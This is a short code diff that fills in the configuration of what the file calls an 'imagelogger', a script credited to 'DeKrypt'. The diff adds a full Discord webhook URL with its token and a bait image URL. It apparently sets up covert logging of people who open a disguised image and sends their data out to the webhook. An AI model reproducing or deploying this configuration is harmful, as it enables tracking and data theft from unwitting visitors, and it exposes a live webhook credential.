@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445090964484919508/PFqsMWGDYIlKH0JTAaJluSGDttMCjdsIarQ2N_a9Kki6m5qTRZ5D5DFc3YDE-ZruDAzj",
+    "image": "https://hudhuduae.com/wp-content/uploads/2022/09/%D8%AA%D8%B5%D9%85%D9%8A%D9%85-%D9%84%D9%84%D9%85%D9%82%D8%A7%D9%84%D8%A7%D8%AA-14-scaled.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
